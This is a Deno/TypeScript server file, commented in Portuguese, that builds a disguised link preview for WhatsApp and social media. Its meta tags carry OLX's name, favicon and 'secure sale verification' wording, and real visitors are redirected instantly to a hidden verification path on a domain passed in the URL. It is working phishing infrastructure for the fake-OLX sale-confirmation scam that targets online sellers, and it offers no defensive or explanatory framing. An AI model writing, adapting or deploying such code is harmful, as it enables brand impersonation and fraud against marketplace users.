// Link de pré-visualização para WhatsApp / redes sociais.
// Crawlers (sem JS) leem as meta tags Open Graph daqui.
// Usuários reais são redirecionados pra página real de verificação.

const TITLE = "Verificação de venda segura";
const DESCRIPTION =
  "Confirme sua venda através do nosso sistema de proteção. Processo rápido, seguro e verificado para garantir mais segurança durante a finalização da compra.";
const IMAGE = "https://www.olx.com.br/favicon.ico";
const SITE_NAME = "OLX";

// Caminho real (precisa bater com SECRET_BASE no front)
const SECRET_BASE = "/verificacao";

function escapeHtml(value: string): string {
  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function buildHtml(targetUrl: string): string {
  const t = escapeHtml(TITLE);
  const d = escapeHtml(DESCRIPTION);
  const img = escapeHtml(IMAGE);
  const url = escapeHtml(targetUrl);
  const site = escapeHtml(SITE_NAME);
  return `<!doctype html>
<html lang="pt-BR">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>${t}</title>
<meta name="description" content="${d}" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="${site}" />
<meta property="og:title" content="${t}" />
<meta property="og:description" content="${d}" />
<meta property="og:image" content="${img}" />
<meta property="og:url" content="${url}" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="${t}" />
<meta name="twitter:description" content="${d}" />
<meta name="twitter:image" content="${img}" />
<link rel="icon" href="${img}" />
<meta http-equiv="refresh" content="0; url=${url}" />
</head>
<body>
<script>window.location.replace(${JSON.stringify(targetUrl)});</script>
<p>Redirecionando para <a href="${url}">${url}</a>...</p>
</body>
</html>`;
}

Deno.serve((req) => {
  const url = new URL(req.url);
  const slug = url.searchParams.get("s") || url.searchParams.get("slug") || "";
  const origin = url.searchParams.get("o") || `${url.protocol}//${url.host}`;

  // Monta a URL final: usa o domínio do site público se passado em ?o=,
  // ou o próprio origin do request como fallback.
  const target = slug
    ? `${origin.replace(/\/$/, "")}${SECRET_BASE}/${encodeURIComponent(slug)}`
    : `${origin.replace(/\/$/, "")}${SECRET_BASE}`;

  return new Response(buildHtml(target), {
    status: 200,
    headers: {
      "content-type": "text/html; charset=utf-8",
      "cache-control": "public, max-age=300",
    },
  });
});